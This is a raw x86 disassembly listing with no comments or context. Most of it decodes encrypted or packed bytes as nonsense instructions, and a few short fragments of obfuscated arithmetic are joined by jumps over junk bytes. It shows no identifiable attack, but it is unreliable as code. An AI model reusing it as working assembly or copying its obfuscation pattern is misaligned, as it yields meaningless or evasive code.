  411528:	and    eax,0x247ea1d5
  41152d:	out    dx,al
  41152e:	aas    
  41152f:	ins    DWORD PTR es:[edi],dx
  411530:	cli    
  411531:	ja     0x411571
  411533:	mov    ebx,0xf1658940
  411538:	add    BYTE PTR [ecx+0x69],cl
  41153b:	xor    eax,0x53efc5ae
  411540:	out    0xc9,eax
  411542:	dec    edx
  411543:	xchg   esp,eax
  411544:	xor    ebp,ebp
  411546:	or     al,0x95
  411548:	adc    al,0x83
  41154a:	jno    0x4114f8
  41154c:	icebp  
  41154d:	test   BYTE PTR [ebp+ecx*2+0x57a69320],dl
  411554:	ror    BYTE PTR ss:[edx-0x64e45c08],0xbe
  41155c:	jmp    0x411560
  41155e:	add    DWORD PTR [edx],0x7832eb5f
  411564:	cli    
  411565:	inc    edx
  411566:	pop    ebx
  411567:	cmp    BYTE PTR [edi+0xb7a42f],ch
  41156d:	fbld   TBYTE PTR [edi]
  41156f:	les    ebp,FWORD PTR [ecx+0x16]
  411572:	xor    eax,0xef0c83a
  411577:	je     0x4115a9
  411579:	fdiv   st,st(7)
  41157b:	cmp    ebp,DWORD PTR [ecx]
  41157d:	sbb    BYTE PTR ds:0x1dffd55d,ah
  411583:	cdq    
  411584:	test   al,dh
  411586:	cwde   
  411587:	pushf  
  411588:	addr16 xchg edx,eax
  41158a:	mov    ebp,0x71b82f78
  41158f:	(bad)  
  411591:	arpl   WORD PTR [edx+0x1b],sp
  411594:	mov    bl,cl
  411596:	mov    ds:0xc8205c22,eax
  41159b:	shl    DWORD PTR [ebp+eiz*8+0x410d0460],cl
  4115a2:	mov    eax,ds:0x509a0c67
  4115a7:	dec    BYTE PTR [edi+0xdf6c955]
  4115ad:	adc    ah,bh
  4115af:	ret    
  4115b0:	xor    DWORD PTR [ebx],edi
  4115b2:	jae    0x4115ef
  4115b4:	mov    eax,ds:0x9d724299
  4115b9:	jb     0x41162f
  4115bb:	shr    BYTE PTR [ecx+0xb754cb8],0x14
  4115c2:	mov    al,ds:0x947118cd
  4115c7:	inc    edi
  4115c8:	call   0xf442a2f9
  4115cd:	cmp    dl,bl
  4115cf:	push   esp
  4115d0:	retf   
  4115d1:	fisttp QWORD PTR [eax]
  4115d3:	push   eax
  4115d4:	sub    bl,0x85
  4115d7:	push   edi
  4115d8:	cmp    ch,dh
  4115da:	adc    DWORD PTR [ebp+0x2f6018dc],ebp
  4115e0:	popf   
  4115e1:	cmp    DWORD PTR [ebx],ebp
  4115e3:	xchg   edx,eax
  4115e4:	gs ret 0xfc99
  4115e8:	xchg   ebx,eax
  4115e9:	call   0xff7503d0
  4115ee:	je     0x411640
  4115f0:	outs   dx,BYTE PTR ds:[esi]
  4115f1:	mov    DWORD PTR [edi+0x1ed9adab],ebp
  4115f7:	add    edx,ecx
  4115f9:	cld    
  4115fa:	jb     0x41159b
  4115fc:	cwde   
  4115fd:	cmp    eax,0x6765ac56
  411602:	sub    DWORD PTR [ecx-0x78d022ba],ecx
  411608:	inc    ebx
  411609:	jge    0x41161c
  41160b:	data16 loop 0x411672
  41160e:	add    ebx,DWORD PTR [esi+0x19023f06]
  411614:	or     dh,bl
  411616:	popa   
  411617:	ror    DWORD PTR [ebx+0x4ec3ef04],0xd9
  41161e:	xor    eax,DWORD PTR [ecx]
  411620:	mov    bh,0x6d
  411622:	cmp    DWORD PTR [ebx-0x23],ebp
  411625:	jmp    0x41169a
  411627:	fnsave [edi+0x3b037930]
  41162d:	mov    bh,0x2c
  41162f:	ins    DWORD PTR es:[edi],dx
  411630:	xchg   edx,eax
  411631:	pushf  
  411632:	(bad)
  411635:	mov    eax,DWORD PTR [edi+ebx*8]
  411638:	cmp    eax,0xa476b6ec
  41163d:	inc    esi
  41163e:	mov    al,ds:0xf6887064
  411643:	(bad)  
  411644:	jae    0x411668
  411646:	pop    esp
  411647:	retf   0xed99
  41164a:	shl    BYTE PTR [edi+0x3ce0d3c5],0xc0
  411651:	bound  edx,QWORD PTR [esp+ecx*4]
  411654:	ds mov bl,0xa2
  411657:	pop    ss
  411658:	xor    ah,BYTE PTR [ecx-0x404cfce6]
  41165e:	sub    al,0xec
  411660:	add    DWORD PTR [esi-0x48],0x215e6473
  411667:	pop    DWORD PTR [edi+eax*8+0x16007523]
  41166e:	repnz loope 0x41168c
  411671:	retf   0xb3fb
  411674:	push   esp
  411675:	pusha  
  411676:	add    esp,esi
  411678:	enter  0x5e92,0x72
  41167c:	gs jecxz 0x411603
  41167f:	push   ebx
  411680:	rol    DWORD PTR ds:0xf0684af0,1
  411686:	add    DWORD PTR [ebx+0x71],esi
  411689:	dec    eax
  41168a:	data16 aas 
  41168c:	stos   DWORD PTR es:[edi],eax
  41168d:	xor    al,0x4
  41168f:	outs   dx,BYTE PTR ds:[esi]
  411690:	js     0x41161e
  411692:	mov    al,0xa8
  411694:	and    ah,cl
  411696:	fdiv   st,st(4)
  411698:	xor    ah,BYTE PTR [ebx]
  41169a:	sub    BYTE PTR [esi],ch
  41169c:	sbb    al,0x85
  41169e:	retf   
  41169f:	into   
  4116a0:	mov    esi,DWORD PTR ds:[eax+0x40374060]
  4116a7:	pushf  
  4116a8:	add    al,0x1f
  4116aa:	test   BYTE PTR [edi+0x14],al
  4116ad:	mov    DWORD PTR [ebp+0x5b],0x4f1ecfaa
  4116b4:	mov    ebp,DWORD PTR ds:0xc9a2ad55
  4116ba:	sub    BYTE PTR [eax-0x6a1c6de0],0xfd
  4116c1:	mov    bh,0xad
  4116c3:	xor    BYTE PTR ss:[edx+esi*1+0x8],dl
  4116c8:	stos   DWORD PTR es:[edi],eax
  4116c9:	aaa    
  4116ca:	or     al,0x1b
  4116cc:	add    eax,0x89959ed7
  4116d1:	test   eax,0x27156799
  4116d6:	mov    edi,0x95a2d932
  4116db:	pop    edx
  4116dc:	inc    ecx
  4116dd:	sar    BYTE PTR [ebp+0x70],cl
  4116e0:	sbb    eax,0x2a2a2307
  4116e5:	inc    edi
  4116e6:	addr16 xchg edx,eax
  4116e8:	lods   al,BYTE PTR ds:[esi]
  4116e9:	rcr    BYTE PTR [esi],0x95
  4116ec:	push   ds
  4116ed:	cmp    DWORD PTR [ecx+0x7d24ca35],ecx
  4116f3:	cs inc esi
  4116f5:	or     al,0x76
  4116f7:	dec    ebx
  4116f8:	int    0xc4
  4116fa:	outs   dx,DWORD PTR ds:[esi]
  4116fb:	adc    BYTE PTR [esi],dh
  4116fd:	cs push ds
  4116ff:	imul   esp,DWORD PTR [esi+0x7e],0x89b5ba05
  411706:	pushf  
  411707:	cld    
  411708:	aam    0xdd
  41170a:	outs   dx,BYTE PTR ds:[esi]
  41170b:	push   gs
  41170d:	and    bh,BYTE PTR [edx-0x25449e43]
  411713:	mov    esi,0x5e5b96f2
  411718:	push   0x73
  41171a:	loope  0x411741
  41171c:	loop   0x41175a
  41171e:	std    
  41171f:	and    edi,DWORD PTR [edx+0x42c489c1]
  411725:	ins    DWORD PTR es:[edi],dx
  411726:	adc    esp,DWORD PTR [edi+edx*8+0x79]
  41172a:	inc    ebx
  41172b:	mov    WORD PTR [ecx+0x75],es
  41172e:	jo     0x41172b
  411730:	es cwde 
  411732:	mov    ds:0xec70e16d,al
  411737:	das    
  411738:	loope  0x411777
  41173a:	fwait
  41173b:	out    dx,eax
  41173c:	pop    edx
  41173d:	mov    eax,0xf8c83564
  411742:	xchg   ebx,eax
  411743:	push   edx
  411744:	sub    DWORD PTR [esi+ecx*4-0x5c],0x1635867f
  41174c:	iret   
  41174d:	bound  ebx,QWORD PTR [edx-0x24ef67f6]
  411753:	leave  
  411754:	stos   BYTE PTR es:[edi],al
  411755:	js     0x411734
  411757:	pop    esp
  411758:	inc    esp
  411759:	mov    esi,0xb543c310
  41175e:	xor    al,0xb2
  411760:	adc    ebp,DWORD PTR [eax-0x55]
  411763:	dec    ebx
  411764:	sbb    edi,DWORD PTR [eax+0x4eee5fc2]
  41176a:	jns    0x4117d2
  41176c:	adc    al,0x39
  41176e:	call   0xd914388
  411773:	dec    edi
  411774:	push   esp
  411775:	blsic  ebp,DWORD PTR [ecx]
  41177a:	cli    
  41177b:	jle    0x411710
  41177d:	mul    DWORD PTR [edx-0x6c3a7c31]
  411783:	cmp    DWORD PTR [edi-0x55],0xffffff8b
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	ja     0x4117bf
  4117b5:	pop    ss
  4117b6:	(bad)  
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	mov    al,0x36
  4117c1:	cli    
  4117c2:	jmp    0x4117bd
  4117c4:	out    0xa8,al
  4117c6:	nop
  4117c7:	and    eax,0xd19d7444
  4117cc:	cmp    al,0xf3
  4117ce:	retf   0x3c46
  4117d1:	sub    ecx,ebp
  4117d3:	cmp    DWORD PTR [ebx],ebx
  4117d5:	inc    eax
  4117d6:	and    al,0xd3
  4117d8:	inc    esi
  4117d9:	addr16 sbb al,0xa8
  4117dc:	and    DWORD PTR [edi+0x14],0xc5f296cf
  4117e3:	cmp    ch,BYTE PTR cs:[edi-0x37bf5d15]
  4117ea:	jne    0x411771
  4117ec:	pusha  
  4117ed:	push   edi
  4117ee:	mov    cl,0x8b
  4117f0:	leave  
  4117f1:	pusha  
  4117f2:	leave  
  4117f3:	js     0x4117a1
  4117f5:	iret   
  4117f6:	cmp    eax,0x3630d13c
  4117fb:	imul   BYTE PTR [ebx+0x233614fc]
  411801:	and    BYTE PTR [edi+0x2c],dh
  411804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411805:	leave  
  411806:	fs push cs
  411808:	dec    ebx
  411809:	scas   eax,DWORD PTR es:[edi]
  41180a:	jae    0x4117c5
  41180c:	(bad)  
  41180d:	cli    
  41180e:	and    al,0x41
  411810:	fidivr WORD PTR [ecx+ebp*2+0x3f]
  411814:	mov    ch,0xae
  411816:	popa   
  411817:	sbb    edi,ecx
  411819:	ret    
  41181a:	sar    DWORD PTR [edx],0xb3
  41181d:	pop    ebx
  41181e:	arpl   WORD PTR [ecx+0x1b],cx
  411821:	ins    DWORD PTR es:[edi],dx
  411822:	(bad)  
  411823:	mov    edi,0x6383471
  411828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411829:	jo     0x41182d
  41182b:	ja     0x41182a
  41182d:	or     DWORD PTR [ecx],esp
  41182f:	(bad)  
  411830:	adc    al,0x4e
  411832:	jmp    0xb7c15b55
  411837:	clc    
  411838:	pop    edi
  411839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41183a:	push   0xe56ce18f
  41183f:	mov    ds:0xdefb6464,al
  411844:	inc    esp
  411845:	rcr    BYTE PTR [ebp+0x22],0x3
  411849:	xchg   edi,eax
  41184a:	pop    edx
  41184b:	mov    ecx,0xcc9ce1b0
  411850:	into   
  411851:	sub    al,0xb2
  411853:	adc    ch,ch
  411855:	or     BYTE PTR [ebx],cl
  411857:	add    al,0x90
  411859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41185a:	xchg   esi,eax
  41185b:	lea    esp,[ebx-0x4557e3d7]
  411861:	push   esp
  411862:	add    eax,0x83cfea4
  411867:	push   eax
  411868:	mov    dl,BYTE PTR [ebx+0x43]
  41186b:	cld    
  41186c:	pusha  
  41186d:	pop    edi
  41186e:	in     eax,0xa0
  411870:	es jae 0x411893
  411873:	jmp    0x411805
  411875:	lea    ebp,[ecx]
  411877:	cmp    dl,cl
  411879:	pusha  
  41187a:	shl    DWORD PTR [ebp-0x3c],cl
  41187d:	aam    0xe8
  41187f:	imul   esp,DWORD PTR [eax+ecx*4-0x68],0xffffffd0
  411884:	mov    eax,ds:0xc695386e
  411889:	sub    BYTE PTR gs:[eax+0x316b9b6],dh
  411890:	xchg   BYTE PTR [esp+ecx*4],dl
  411893:	rol    DWORD PTR [edx],1
  411895:	jmp    0x4118f5
  411897:	mov    ecx,0x808bc934
  41189c:	ins    BYTE PTR es:[edi],dx
  41189d:	test   DWORD PTR [esi-0x30],ecx
  4118a0:	ds call 0xc4ed:0x33ac983d
  4118a8:	mov    eax,ecx
  4118aa:	icebp  
  4118ab:	int3   
  4118ac:	sub    BYTE PTR [edx],0x4e
  4118af:	pop    esi
  4118b0:	mov    ecx,0x6d541f32
  4118b5:	adc    BYTE PTR ds:0x9bf182b9,ah
  4118bb:	(bad)  
  4118bc:	xor    dh,bl
  4118be:	adc    cl,al
  4118c0:	mov    ecx,0x1610202d
  4118c5:	test   BYTE PTR [ebx+ebp*4],cl
  4118c8:	lods   eax,DWORD PTR ds:[esi]
  4118c9:	(bad)  
  4118ca:	je     0x4118b8
  4118cc:	sbb    BYTE PTR [ebp+0x1b986ca0],0x7b
  4118d3:	adc    BYTE PTR [eax+0x33b0f695],bl
  4118d9:	add    ch,BYTE PTR [ebx]
  4118db:	inc    ebp
  4118dc:	mov    eax,0x93ae6732
  4118e1:	popf   
  4118e2:	dec    esp
  4118e3:	adc    bh,BYTE PTR [ebx-0x7af3d9fc]
  4118e9:	inc    ebp
  4118ea:	mov    ebp,0x856a545a
  4118ef:	in     eax,dx
  4118f0:	mov    eax,ds:0x9ffcbeee
  4118f5:	jne    0x41195b
  4118f7:	pop    ds
  4118f8:	mov    al,ds:0xfc82311
  4118fd:	adc    ah,BYTE PTR ss:[eax]
  411900:	aas    
  411901:	or     al,0xd4
  411903:	jb     0x4118be
  411905:	scas   al,BYTE PTR es:[edi]
  411906:	jo     0x4118a8
  411908:	cmp    eax,0x380e458e
  41190d:	cs jns 0x4118ad
  411910:	(bad)  
  411911:	mov    eax,0x60756af2
  411916:	int3   
  411917:	paddd  mm5,QWORD PTR ds:0xa96035b6
  41191e:	sub    eax,DWORD PTR [ebx]
  411920:	(bad)  
  411921:	mov    ebp,0xc65a2
  411926:	inc    ebp
  411927:	retf   
  411928:	enter  0x4689,0xc4
  41192c:	ret    0x21f1
  41192f:	popa   
  411930:	cmp    bl,BYTE PTR [ebp+edi*4-0x61]
  411934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411935:	sbb    BYTE PTR [ebx-0x26],dh
  411938:	mov    bh,0x3f
  41193a:	mov    ds:0x45f36ee7,al
  41193f:	ret    0xd65d
  411942:	ret    
  411943:	jmp    0x4118fe
  411945:	ins    BYTE PTR es:[edi],dx
  411946:	ds sub eax,0xb943c343
  41194c:	jecxz  0x4118f4
  41194e:	(bad)  
  411950:	inc    edx
  411951:	pop    ds
  411952:	int3   
  411953:	mov    eax,0x64a0238f
  411958:	retf   
  411959:	jbe    0x4119af
  41195b:	adc    DWORD PTR [ebx+ebx*8-0x23871799],esi
  411962:	retf   0x1be3
  411965:	cwde   
  411966:	jnp    0x41197c
  411968:	pop    ecx
  411969:	cdq    
  41196a:	mov    dl,0x58
  41196c:	push   ss
  41196d:	aaa    
  41196e:	dec    esp
  41196f:	outs   dx,DWORD PTR ds:[esi]
  411970:	pop    esp
  411971:	nop
  411972:	loope  0x4119dc
  411974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411975:	dec    ebp
  411976:	retf   
  411977:	pop    ds
  411978:	add    DWORD PTR [ecx+edx*2],eax
  41197b:	inc    edx
  41197d:	sar    DWORD PTR [edi],0x94
  411980:	loopne 0x4119f2
  411982:	icebp  
  411983:	lock pop edx
  411985:	push   ss
  411986:	shl    DWORD PTR [esi],0x34
  411989:	stos   BYTE PTR es:[edi],al
  41198a:	dec    esi
  41198b:	scas   eax,DWORD PTR es:[edi]
  41198c:	repz jb 0x411958
  41198f:	retf   0xc111
  411992:	cwde   
  411993:	pop    ecx
  411994:	mov    ch,0x46
  411996:	arpl   WORD PTR [edi],dx
  411998:	sbb    ecx,DWORD PTR [esi-0x3c8f250f]
  41199e:	ds dec ebx
  4119a0:	and    al,cl
  4119a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a3:	mov    bl,0x4b
  4119a5:	and    DWORD PTR [ebx],ecx
  4119a7:	ja     0x411964
  4119a9:	adc    ah,cl
  4119ab:	pusha  
  4119ac:	(bad)  
  4119ae:	ficomp DWORD PTR [esi+eiz*1+0x4a]
  4119b2:	jg     0x41197a
  4119b4:	mov    ah,0xc7
  4119b6:	imul   ebx,DWORD PTR [esi],0x33
  4119b9:	iret   
  4119ba:	in     al,0xe1
  4119bc:	inc    esi
  4119bd:	inc    eax
  4119be:	shl    ebx,1
  4119c0:	fstp   TBYTE PTR [ebx+ecx*2+0x26879c4a]
  4119c7:	enter  0xc261,0xfe
  4119cb:	xor    al,0x6f
  4119cd:	jb     0x411979
  4119cf:	dec    edx
  4119d0:	mov    ch,0x17
  4119d2:	sub    al,0xe7
  4119d4:	jnp    0x411959
  4119d6:	jecxz  0x411a07
  4119d8:	push   cs
  4119d9:	pop    ebx
  4119da:	cmp    DWORD PTR [eax-0x10],edx
  4119dd:	pushf  
  4119de:	jmp    0x3221d4ac
  4119e3:	cmp    esi,ecx
  4119e5:	stos   BYTE PTR es:[edi],al
  4119e6:	outs   dx,BYTE PTR ds:[esi]
  4119e7:	int3   
  4119e8:	shl    ebp,cl
  4119ea:	sti    
  4119eb:	and    BYTE PTR [eax+0x29],0x4c
  4119ef:	or     ah,ah
  4119f1:	jno    0x411a25
  4119f3:	sbb    al,0xf4
  4119f5:	cmc    
  4119f6:	jl     0x411a10
  4119f8:	(bad)  
  4119f9:	jne    0x4119e6
  4119fb:	or     eax,0x723489dd
  411a00:	outs   dx,BYTE PTR ds:[esi]
  411a01:	js     0x411a57
  411a03:	je     0x411a29
  411a05:	retf   0x210
  411a08:	xlat   BYTE PTR ds:[ebx]
  411a09:	cmp    al,0x4e
  411a0b:	mov    ch,0x17
  411a0d:	fld    QWORD PTR [edx+0x59]
  411a10:	retf   
  411a11:	aad    0xba
  411a13:	or     al,0xbb
  411a15:	nop
  411a16:	jo     0x411a47
  411a18:	xchg   esi,eax
  411a19:	cwde   
  411a1a:	ds xchg edi,eax
  411a1c:	and    eax,0xe1836629
  411a21:	add    DWORD PTR [edi-0x630f249e],edi
  411a27:	xor    bh,BYTE PTR [eax-0xfa27491]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x10d7da8b
  411a62:	xor    eax,0x60916f26
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	cs mov cl,0xa8
  411a70:	jb     0x411a65
  411a72:	jle    0x411ab4
  411a74:	sahf   
  411a75:	pop    ds
  411a76:	adc    esi,ecx
  411a78:	clc    
  411a79:	das    
  411a7a:	add    BYTE PTR [ecx],ch
  411a7c:	sub    BYTE PTR [edi+0x3dae9c3a],cl
  411a82:	sub    DWORD PTR [edx+0x2c],0x53
  411a86:	dec    ebx
  411a87:	leave  
  411a88:	push   esp
  411a89:	mov    dh,0xe3
  411a8b:	add    ch,BYTE PTR [eax+0xfd42ce0]
  411a91:	ficom  WORD PTR [ebx]
  411a93:	jae    0x411af7
  411a95:	ins    BYTE PTR es:[edi],dx
  411a96:	and    dh,BYTE PTR [edi]
  411a98:	ds cld 
  411a9a:	gs xchg ebp,eax
  411a9c:	icebp  
  411a9d:	out    0xe6,al
  411a9f:	sahf   
  411aa0:	daa    
  411aa1:	mov    ds:0x97874e68,al
  411aa6:	out    dx,al
  411aa7:	mov    DWORD PTR [edx+0x53],edi
  411aaa:	lock push ds
  411aac:	push   esi
  411aad:	mov    ah,0x25
  411aaf:	shl    al,cl
  411ab1:	and    DWORD PTR [edi],edx
  411ab3:	cmp    DWORD PTR [edi+0x58],ebx
  411ab6:	shr    BYTE PTR [edx+0x1b],1
  411ab9:	adc    al,0xfd
  411abb:	rol    BYTE PTR [ecx+0x6770f27c],0x1a
  411ac2:	retf   
  411ac3:	scas   eax,DWORD PTR es:[edi]
  411ac4:	mov    bl,BYTE PTR [edx+0x445e2d83]
  411aca:	adc    ecx,DWORD PTR [ebx-0x136baf26]
  411ad0:	sbb    edi,DWORD PTR [edx-0x3db53ee3]
  411ad6:	sbb    eax,0xb1439622
  411adb:	sbb    BYTE PTR [ecx+0x7],dl
  411ade:	push   ds
  411adf:	and    eax,ecx
  411ae1:	pop    es
  411ae2:	and    esi,eax
  411ae4:	add    BYTE PTR [ebx-0x29fa0155],bl
  411aea:	(bad)  
  411aeb:	in     eax,dx
  411aec:	sbb    DWORD PTR [esi],edx
  411aee:	jae    0x411adb
  411af0:	pop    edx
  411af1:	out    0x7b,al
  411af3:	(bad)  
  411af4:	cs mov bl,0x6
  411af7:	outs   dx,DWORD PTR ds:[esi]
  411af8:	out    dx,eax
  411af9:	cmp    eax,0x2c6fe9b
  411afe:	fist   DWORD PTR [eax+esi*2-0x7e]
  411b02:	mov    bl,0x63
  411b04:	inc    edx
  411b05:	or     bl,BYTE PTR [eax+0xd1842d3]
  411b0b:	mov    ah,0x2f
  411b0d:	cmc    
  411b0e:	pop    ss
  411b0f:	lock inc edi
  411b11:	mov    bh,0xb1
  411b13:	ret    0x3d83
  411b16:	pop    ecx
  411b17:	scas   al,BYTE PTR es:[edi]
  411b18:	add    DWORD PTR [esi+esi*4+0x7369f2cf],edi
  411b1f:	das    
  411b20:	adc    eax,0x9ac64827
  411b25:	les    edi,FWORD PTR [eax]
  411b27:	imul   edx,DWORD PTR [esi+0x20c6ae70],0x1b
  411b2e:	popf   
  411b2f:	repnz sbb al,cl
  411b32:	pop    ss
  411b33:	jae    0x411ae9
  411b35:	test   DWORD PTR [ecx+ecx*2],edx
  411b38:	add    dh,BYTE PTR [esi+0x7e]
  411b3b:	imul   ebx,DWORD PTR [edi-0x1a],0xec918059
  411b42:	fwait
  411b43:	dec    ebp
  411b44:	dec    esi
  411b45:	mov    edi,0x5fc40912
  411b4a:	imul   edx,DWORD PTR [eax+0x27],0x7d
  411b4e:	les    esi,FWORD PTR [ecx+esi*1+0x48]
  411b52:	stc    
  411b53:	jmp    0x7677:0x80502b3b
  411b5a:	scas   al,BYTE PTR es:[edi]
  411b5b:	cmp    DWORD PTR [ebx],0xffffff9d
  411b5e:	and    dh,BYTE PTR [edx]
  411b60:	pop    ebp
  411b61:	fsubrp st(7),st
  411b63:	mov    ch,0xb9
  411b65:	gs call 0x702f:0x160d137f
  411b6d:	and    al,0x29
  411b6f:	inc    eax
  411b70:	nop
  411b71:	fimul  WORD PTR [edx-0x41fbea22]
  411b77:	jmp    0x9632a2f2
  411b7c:	add    BYTE PTR [ebx-0x10f1e751],ah
  411b82:	jmp    0xea39:0x67165324
  411b89:	mov    BYTE PTR [edx+0x5ac87bfc],bh
  411b8f:	push   edi
  411b90:	(bad)  
  411b91:	sbb    bh,BYTE PTR [ecx+eax*4-0x3c]
  411b95:	dec    ebp
  411b96:	or     BYTE PTR [edx-0x4a74e2cf],dl
  411b9c:	and    DWORD PTR [ecx],eax
  411b9e:	xor    edi,DWORD PTR [ebx+0x4b]
  411ba1:	sbb    DWORD PTR [ebx],ebp
  411ba3:	mov    dl,0xce
  411ba5:	mov    ch,0x85
  411ba7:	adc    bl,BYTE PTR [esi-0xa]
  411baa:	push   si
  411bac:	push   ecx
  411bad:	dec    eax
  411bae:	xor    al,0x59
  411bb0:	pushf  
  411bb1:	stos   BYTE PTR es:[edi],al
  411bb2:	int3   
  411bb3:	retf   0xb68
  411bb6:	mov    ecx,0x23308717
  411bbb:	popa   
  411bbc:	aam    0x51
  411bbe:	mov    al,ds:0x80e1de0e
  411bc3:	push   ecx
  411bc4:	or     al,0x86
  411bc6:	mov    bl,0xee
  411bc8:	pop    edx
  411bc9:	jecxz  0x411b92
  411bcb:	in     al,0x51
  411bcd:	sub    eax,0x439312ef
  411bd2:	out    dx,eax
  411bd3:	dec    esp
  411bd4:	rcr    BYTE PTR ss:0x98ed4d89,cl
  411bdb:	cmp    ch,BYTE PTR [ebx+ecx*4]
  411bde:	cmp    DWORD PTR [esi+0x41],esi
  411be1:	out    dx,eax
  411be2:	fisttp WORD PTR [ecx]
  411be4:	icebp  
  411be5:	pop    esp
  411be6:	(bad)  
  411be7:	adc    DWORD PTR [esi-0x51],esp
  411bea:	mov    al,ds:0x3a2140d3
  411bef:	add    ecx,esi
  411bf1:	push   ebx
  411bf2:	xchg   edx,eax
  411bf3:	mov    al,0xdf
  411bf5:	clc    
  411bf6:	mov    esi,0xdca9a60e
  411bfb:	push   ss
  411bfc:	mov    cl,0x5e
  411bfe:	and    ebx,edx
  411c00:	(bad)  
  411c01:	outs   dx,BYTE PTR ds:[esi]
  411c02:	sbb    bh,BYTE PTR [edi-0x2b503a95]
  411c08:	outs   dx,DWORD PTR ss:[esi]
  411c0a:	outs   dx,DWORD PTR ds:[esi]
  411c0b:	loop   0x411b96
  411c0d:	rcl    DWORD PTR [ecx],0x29
  411c10:	fcmovnu st,st(3)
  411c12:	pop    ecx
  411c13:	mov    al,ds:0x799fa34a
  411c18:	add    ecx,esi
  411c1a:	out    dx,al
  411c1b:	fcmovnu st,st(0)
  411c1d:	push   edx
  411c1e:	mov    DWORD PTR [esi+0x5376a508],edx
  411c24:	pop    esi
  411c25:	pop    edx
  411c26:	aas    
  411c27:	shl    BYTE PTR [ecx],cl
  411c29:	test   al,0xcd
  411c2b:	or     BYTE PTR [ebp+0x21],0xab
  411c2f:	add    BYTE PTR [ebx-0x52],cl
  411c32:	sbb    BYTE PTR [edi],dh
  411c34:	aas    
  411c35:	xchg   ecx,eax
  411c36:	mov    ecx,0xfc64f599
  411c3b:	add    ecx,esp
  411c3d:	aaa    
  411c3e:	out    dx,al
  411c3f:	xchg   ebx,eax
  411c40:	jge    0x411bfb
  411c42:	push   es
  411c43:	mov    edx,0xc5f11e2a
  411c48:	int    0x6e
  411c4a:	mov    esp,0x65f6814
  411c4f:	fstp   QWORD PTR [esi+0x4e4f8340]
  411c55:	cmp    ebp,ecx
  411c57:	(bad)  
  411c58:	jmp    0xc1a0:0x7b408b81
  411c5f:	ror    cl,cl
  411c61:	dec    edx
  411c62:	pop    sp
  411c64:	in     eax,0xc3
  411c66:	or     al,0x6
  411c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c69:	rcl    eax,cl
  411c6b:	mov    BYTE PTR [edx*8-0x2159a76b],al
  411c72:	jge    0x411c2a
  411c74:	nop
  411c75:	sar    BYTE PTR [ecx],1
  411c77:	or     al,0xf9
  411c79:	or     ebx,DWORD PTR [ebp+0x1b]
  411c7c:	mov    ebp,0x57749f1f
  411c81:	stos   DWORD PTR es:[edi],eax
  411c82:	add    DWORD PTR [ebp+0x30de9dc],0x55
  411c89:	repz out 0x24,al
  411c8c:	jbe    0x411c41
  411c8e:	in     al,0x61
  411c90:	fld    TBYTE PTR [ebp+0x2890642a]
  411c96:	das    
  411c97:	aaa    
  411c98:	fdivrp st(0),st
  411c9a:	dec    edi
  411c9b:	(bad)  
  411c9c:	adc    al,0xd9
  411c9e:	and    DWORD PTR [ebp-0x7d],ebx
  411ca1:	pushf  
  411ca2:	xchg   ecx,eax
  411ca3:	rol    bl,cl
  411ca5:	jae    0x411c89
  411ca7:	in     eax,dx
  411ca8:	xor    BYTE PTR [edi],0xd3
  411cab:	push   0x7c
  411cad:	pop    ds
  411cae:	les    edi,FWORD PTR [edx]
  411cb0:	jno    0x411c83
  411cb2:	dec    eax
  411cb3:	pop    es
  411cb4:	sub    BYTE PTR [edx+eiz*2-0x4c],0x9e
  411cb9:	mov    gs,eax
  411cbb:	push   cs
  411cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cbd:	mov    ebx,0x31eb239f
  411cc2:	xor    al,0x81
  411cc4:	outs   dx,BYTE PTR ds:[esi]
  411cc5:	adc    ebx,0x3e
  411cc8:	shl    bl,cl
  411cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ccb:	fs xchg edx,eax
  411ccd:	jmp    0x411d26
  411ccf:	add    dl,0xe7
  411cd2:	dec    ebp
  411cd3:	sub    al,0xcf
  411cd5:	add    cl,ch
  411cd7:	mov    ecx,0x8bf87d8b
  411cdc:	pop    ebp
  411cdd:	lock sub ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x2c66579e
  411cfd:	cs sub bh,dl
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	fsubp  st(0),st
